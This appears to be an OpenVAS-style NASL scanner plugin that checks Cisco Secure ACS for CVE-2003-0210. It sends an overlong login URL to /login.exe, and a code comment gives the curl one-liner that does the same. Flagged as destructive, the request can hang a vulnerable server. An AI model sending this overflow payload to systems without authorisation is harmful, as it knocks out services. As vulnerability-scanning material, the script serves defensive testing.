# SPDX-FileCopyrightText: 2003 Xue Yong Zhi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11556");
  script_version("2025-04-11T05:40:28+0000");
  script_tag(name:"last_modification", value:"2025-04-11 05:40:28 +0000 (Fri, 11 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/7413");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2003-0210");
  script_name("CISCO Secure ACS Management Interface Login Overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2003 Xue Yong Zhi");
  script_family("CISCO");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 2002);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Cisco has already released a patch for this problem.");

  script_tag(name:"summary", value:"It may be possible to make this Cisco Secure ACS web
  server(login.exe) execute arbitrary code by sending it a too long login url.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_404.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:2002 );
if( http_is_dead( port:port ) )
  exit( 0 );

if( http_is_cgi_installed_ka( port:port, item:"/login.exe" ) ) {

  # curl -i "http://host:2002/login.exe?user=`perl -e "print ('a'x400)"`&reply=any&id=1"
  url = string( "/login.exe?user=", crap(400), "&reply=any&id=1" );
  req = http_get( item:url, port:port );
  res = http_send_recv( port:port, data:req );

  #The request will make a vulnerable server suspend until a restart
  if( http_is_dead( port:port ) ) {
    security_message( port:port );
    exit( 0 );
  }
}

exit( 99 );
